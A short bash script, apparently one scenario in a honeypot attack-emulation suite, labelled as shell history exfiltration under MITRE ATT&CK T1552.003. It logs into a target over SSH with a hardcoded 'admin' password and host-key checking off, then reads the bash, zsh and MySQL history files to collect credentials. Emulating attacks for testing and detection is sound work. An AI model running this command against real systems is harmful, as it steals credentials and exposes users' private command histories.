#!/usr/bin/env bash
# S11 — Shell History Exfiltration
# Tactic : Credential Access (TA0006)
# Technique: T1552.003 Unsecured Credentials: Bash History
TARGET="${1:-safe-honeypot}"
SSH="sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=30 ${TARGET} -p 2222"
echo "=== S11 Shell History Exfil — ${TARGET} ==="
$SSH "cat ~/.bash_history 2>/dev/null; cat ~/.zsh_history 2>/dev/null; cat ~/.mysql_history 2>/dev/null" && echo "[OK]" || echo "[FAIL]"
